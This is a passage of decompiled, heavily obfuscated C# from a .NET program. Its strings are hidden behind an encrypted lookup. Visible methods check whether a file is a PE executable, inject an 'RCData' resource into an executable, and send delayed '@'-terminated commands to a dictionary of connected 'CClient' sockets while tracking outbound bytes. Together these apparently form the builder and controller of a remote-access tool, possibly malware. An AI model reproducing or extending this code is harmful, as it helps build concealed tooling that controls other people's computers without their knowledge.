		return (string)Class149.smethod_0().method_256(Class149.smethod_1(), ")&O58*?7ot", object_);
	}

	// Token: 0x060012A5 RID: 4773 RVA: 0x000868FC File Offset: 0x00084AFC
	public static string smethod_34(ref string string_0)
	{
		UTF8Encoding utf8Encoding = new UTF8Encoding(true);
		byte[] bytes = utf8Encoding.GetBytes(string_0);
		return utf8Encoding.GetString(bytes);
	}

	// Token: 0x060012A6 RID: 4774 RVA: 0x00086920 File Offset: 0x00084B20
	public static string smethod_35(long long_0, bool bool_0)
	{
		object[] object_ = new object[]
		{
			long_0,
			bool_0
		};
		return (string)Class149.smethod_0().method_256(Class149.smethod_1(), ")&O5a*?7Kh", object_);
	}

	// Token: 0x060012A7 RID: 4775 RVA: 0x00086960 File Offset: 0x00084B60
	public static long smethod_36()
	{
		return checked((long)Math.Round((DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalMilliseconds));
	}

	// Token: 0x060012A8 RID: 4776 RVA: 0x00086994 File Offset: 0x00084B94
	public static long smethod_37()
	{
		return (long)(checked((int)Math.Round((DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0)).TotalHours)));
	}

	// Token: 0x060012A9 RID: 4777 RVA: 0x000869CC File Offset: 0x00084BCC
	public static string smethod_38(long long_0)
	{
		object[] object_ = new object[]
		{
			long_0
		};
		return (string)Class149.smethod_0().method_256(Class149.smethod_1(), ")&O6j*?9#>", object_);
	}

	// Token: 0x060012AA RID: 4778 RVA: 0x00086A04 File Offset: 0x00084C04
	public static bool smethod_39(string string_0)
	{
		object[] object_ = new object[]
		{
			string_0
		};
		return (bool)Class149.smethod_0().method_256(Class149.smethod_1(), ")&O9<*?9DI", object_);
	}

	// Token: 0x060012AB RID: 4779 RVA: 0x00086A3C File Offset: 0x00084C3C
	public static string smethod_40(string string_0)
	{
		string text = string.Empty;
		checked
		{
			int num = string_0.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				text += Strings.Asc(string_0.Substring(i, 1)).ToString("x").ToUpper();
			}
			return text;
		}
	}

	// Token: 0x060012AC RID: 4780 RVA: 0x0000A455 File Offset: 0x00008655
	public static string smethod_41()
	{
		return (string)Class149.smethod_0().method_256(Class149.smethod_1(), ")&O8E*?8T2", null);
	}

	// Token: 0x060012AD RID: 4781 RVA: 0x0000A471 File Offset: 0x00008671
	private static string smethod_42()
	{
		return (string)Class149.smethod_0().method_256(Class149.smethod_1(), ")&O9:*?:Lh", null);
	}

	// Token: 0x060012AE RID: 4782 RVA: 0x0000A48D File Offset: 0x0000868D
	private static string smethod_43()
	{
		return (string)Class149.smethod_0().method_256(Class149.smethod_1(), ")&O:&*?9qX", null);
	}

	// Token: 0x060012AF RID: 4783 RVA: 0x0000A4A9 File Offset: 0x000086A9
	public static string smethod_44()
	{
		return (string)Class149.smethod_0().method_256(Class149.smethod_1(), ")&O:@*?;d7", null);
	}

	// Token: 0x060012B0 RID: 4784 RVA: 0x0000A4C5 File Offset: 0x000086C5
	private static string smethod_45()
	{
		return (string)Class149.smethod_0().method_256(Class149.smethod_1(), ")&O8q*?;7(", null);
	}

	// Token: 0x060012B1 RID: 4785 RVA: 0x0000A4E1 File Offset: 0x000086E1
	private static string smethod_46()
	{
		return (string)Class149.smethod_0().method_256(Class149.smethod_1(), ")&O7t*?<]Q", null);
	}

	// Token: 0x060012B2 RID: 4786 RVA: 0x0000A4FD File Offset: 0x000086FD
	private static string smethod_47()
	{
		return (string)Class149.smethod_0().method_256(Class149.smethod_1(), ")&O8>*?<?G", null);
	}

	// Token: 0x060012B3 RID: 4787 RVA: 0x0000A519 File Offset: 0x00008719
	private static string smethod_48()
	{
		return (string)Class149.smethod_0().method_256(Class149.smethod_1(), ")&O8+*?<$>", null);
	}

	// Token: 0x060012B4 RID: 4788 RVA: 0x00086A8C File Offset: 0x00084C8C
	private static string smethod_49(string string_0, string[] string_1)
	{
		object[] object_ = new object[]
		{
			string_0,
			string_1
		};
		return (string)Class149.smethod_0().method_256(Class149.smethod_1(), ")&O6Z*?:Ff", object_);
	}

	// Token: 0x060012B5 RID: 4789 RVA: 0x00086AC4 File Offset: 0x00084CC4
	public static string smethod_50(ref object object_0)
	{
		object[] array = new object[]
		{
			object_0
		};
		Class4 @class = Class149.smethod_0();
		Stream stream_ = Class149.smethod_1();
		string result;
		try
		{
			result = (string)@class.method_256(stream_, ")&O7E*?:(\\", array);
		}
		finally
		{
			object_0 = (object)array[0];
		}
		return result;
	}

	// Token: 0x060012B6 RID: 4790 RVA: 0x00086B28 File Offset: 0x00084D28
	private static string smethod_51(ref IList<byte> ilist_0)
	{
		object[] array = new object[]
		{
			ilist_0
		};
		Class4 @class = Class149.smethod_0();
		Stream stream_ = Class149.smethod_1();
		string result;
		try
		{
			result = (string)@class.method_256(stream_, ")&O5d*?9qX", array);
		}
		finally
		{
			ilist_0 = (IList<byte>)array[0];
		}
		return result;
	}

	// Token: 0x060012B7 RID: 4791 RVA: 0x0000A535 File Offset: 0x00008735
	public static string smethod_52()
	{
		return (string)Class149.smethod_0().method_256(Class149.smethod_1(), ")&O:'*?=bo", null);
	}

	// Token: 0x060012B8 RID: 4792 RVA: 0x0000A551 File Offset: 0x00008751
	public static string smethod_53()
	{
		return (string)Class149.smethod_0().method_256(Class149.smethod_1(), ")&O9Z*?=>c", null);
	}

	// Token: 0x060012B9 RID: 4793 RVA: 0x00086B8C File Offset: 0x00084D8C
	public static bool smethod_54(string string_0)
	{
		string @string = Encoding.UTF8.GetString(File.ReadAllBytes(string_0));
		return Conversions.ToBoolean(Interaction.IIf(Operators.CompareString(@string.Substring(checked(Strings.InStr(@string, "PE\0\0", CompareMethod.Text) + 3), 1).ToLower(), "l", true) == 0, false, true));
	}

	// Token: 0x060012BA RID: 4794 RVA: 0x00086BE8 File Offset: 0x00084DE8
	public static bool smethod_55(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			IntPtr intptr_ = Class136.BeginUpdateResource(string_0, false);
			IntPtr intptr_2 = Class136.smethod_56(byte_0);
			Class136.UpdateResource(intptr_, "RCData", string_1, 1033, intptr_2, byte_0.Length);
			Class136.EndUpdateResource(intptr_, false);
		}
		catch (Exception ex)
		{
			return false;
		}
		return true;
	}

	// Token: 0x060012BB RID: 4795 RVA: 0x00086C48 File Offset: 0x00084E48
	private static IntPtr smethod_56(object object_0)
	{
		GCHandle gchandle = GCHandle.Alloc(RuntimeHelpers.GetObjectValue(object_0), GCHandleType.Pinned);
		IntPtr result;
		try
		{
			result = gchandle.AddrOfPinnedObject();
		}
		finally
		{
			gchandle.Free();
		}
		return result;
	}

	// Token: 0x04000739 RID: 1849
	private static Random random_0;

	// Token: 0x0400073A RID: 1850
	private static StaticLocalInitFlag staticLocalInitFlag_0;

	// Token: 0x0200014C RID: 332
	internal sealed class Class137
	{
		// Token: 0x060012BD RID: 4797 RVA: 0x0000A56D File Offset: 0x0000876D
		internal void _Lambda$__0()
		{
			Class136.smethod_25(this.bool_0);
		}

		// Token: 0x0400073B RID: 1851
		public bool bool_0;
	}

	// Token: 0x0200014D RID: 333
	internal sealed class Class138
	{
		// Token: 0x060012BF RID: 4799 RVA: 0x00086C88 File Offset: 0x00084E88
		internal void _Lambda$__0()
		{
			ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
			string key;
			CClient value = concurrentDictionary_[key = this.string_0];
			long num = this.long_0;
			ref string ptr = ref this.string_1;
			ref CClient ptr2 = ref value;
			ConcurrentDictionary<string, CClient> concurrentDictionary = concurrentDictionary_;
			try
			{
				if (num > 0L)
				{
					Thread.Sleep(checked((int)(num * 60000L)));
				}
				ptr += "@";
				byte[] bytes = Encoding.UTF8.GetBytes(ptr);
				ptr2.sock_async.method_6(bytes);
				CClient cclient = ptr2;
				ref double ptr3 = ref cclient.stats_bytes_out;
				cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_3;
				Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_5;
				Class130.struct20_0.double_5 = ptr3 + 1.0;
			}
			catch (Exception ex)
			{
			}
			concurrentDictionary[key] = value;
		}

		// Token: 0x0400073C RID: 1852
		public string string_0;

		// Token: 0x0400073D RID: 1853
		public string string_1;

		// Token: 0x0400073E RID: 1854
		public long long_0;
	}

	// Token: 0x0200014E RID: 334
	[Serializable]
	internal sealed class Class139
	{
		// Token: 0x060012C2 RID: 4802 RVA: 0x0000A586 File Offset: 0x00008786
		internal void _Lambda$__44-0()
		{
			Class136.smethod_24();
		}

		// Token: 0x0400073F RID: 1855
		public static readonly Class136.Class139 class139_0 = new Class136.Class139();

		// Token: 0x04000740 RID: 1856
		public static ThreadStart threadStart_0;
	}

	// Token: 0x0200014F RID: 335
	internal sealed class Class140
	{
		// Token: 0x060012C4 RID: 4804 RVA: 0x0000A58D File Offset: 0x0000878D
		internal void _Lambda$__0()
		{
			Class136.smethod_22(ref this.string_0);
		}

		// Token: 0x04000741 RID: 1857
		public string string_0;
	}

	// Token: 0x02000150 RID: 336
	internal sealed class Class141
	{
		// Token: 0x060012C6 RID: 4806 RVA: 0x0000A59A File Offset: 0x0000879A
		internal bool _Lambda$__0(char char_1)
		{
			return char_1 == this.char_0;
		}

		// Token: 0x04000742 RID: 1858
		public char char_0;
	}

	// Token: 0x02000151 RID: 337
	internal sealed class Class142
	{
		// Token: 0x060012C8 RID: 4808 RVA: 0x0000A5A5 File Offset: 0x000087A5
		internal void _Lambda$__0()
		{
			Class136.smethod_15(ref this.string_0, ref this.byte_0, this.bool_0);
		}

		// Token: 0x04000743 RID: 1859
		public string string_0;

		// Token: 0x04000744 RID: 1860
		public byte[] byte_0;

		// Token: 0x04000745 RID: 1861
		public bool bool_0;
	}

	// Token: 0x02000152 RID: 338
	public struct Struct27
	{
		// Token: 0x04000746 RID: 1862
		public int int_0;

		// Token: 0x04000747 RID: 1863
		public int int_1;

		// Token: 0x04000748 RID: 1864
		public int int_2;

		// Token: 0x04000749 RID: 1865
		public int int_3;

		// Token: 0x0400074A RID: 1866
		public int int_4;

		// Token: 0x0400074B RID: 1867
		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
		public string string_0;
	}

	// Token: 0x02000153 RID: 339
	private struct Struct28
	{
		// Token: 0x0400074C RID: 1868
		public string string_0;

		// Token: 0x0400074D RID: 1869
		public int int_0;

		// Token: 0x0400074E RID: 1870
		public string string_1;

		// Token: 0x0400074F RID: 1871
		public int int_1;

		// Token: 0x04000750 RID: 1872
		public string string_2;

		// Token: 0x04000751 RID: 1873
		public int int_2;
	}

	// Token: 0x02000154 RID: 340
	// (Invoke) Token: 0x060012CC RID: 4812
	private delegate void Delegate110();
}
